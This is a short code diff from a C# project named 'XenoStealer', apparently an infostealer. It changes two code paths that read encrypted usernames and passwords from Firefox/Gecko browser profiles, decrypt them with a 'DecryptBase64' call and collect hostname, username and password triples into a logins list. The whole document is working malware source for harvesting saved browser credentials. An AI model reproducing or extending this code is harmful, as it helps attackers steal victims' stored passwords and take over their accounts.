@@ -252,8 +252,8 @@ namespace XenoStealer
                         {
                             continue;
                         }
-                        string username = GeckoDecryptor.Decrypt(profilePath, encryptedUsername);
-                        string password = GeckoDecryptor.Decrypt(profilePath, encryptedPassword);
+                        string username = GeckoDecryptor.DecryptBase64(profilePath, encryptedUsername);
+                        string password = GeckoDecryptor.DecryptBase64(profilePath, encryptedPassword);
                         if (hostname == null || username == null || password == null) continue;
                         logins.Add(new DataExtractionStructs.GeckoLogin(username, password, hostname));
                         //add it to passwords and stuff.
@@ -301,8 +301,8 @@ namespace XenoStealer
                                 string hostname = (string)login["hostname"];
                                 string encryptedUsername = (string)login["encryptedUsername"];
                                 string encryptedPassword = (string)login["encryptedPassword"];
-                                string username = GeckoDecryptor.Decrypt(profilePath, encryptedUsername);
-                                string password = GeckoDecryptor.Decrypt(profilePath, encryptedPassword);
+                                string username = GeckoDecryptor.DecryptBase64(profilePath, encryptedUsername);
+                                string password = GeckoDecryptor.DecryptBase64(profilePath, encryptedPassword);
                                 if (hostname == null || username == null || password == null) continue;
                                 logins.Add(new DataExtractionStructs.GeckoLogin(username, password, hostname));
                                 //add it to passwords and stuff.
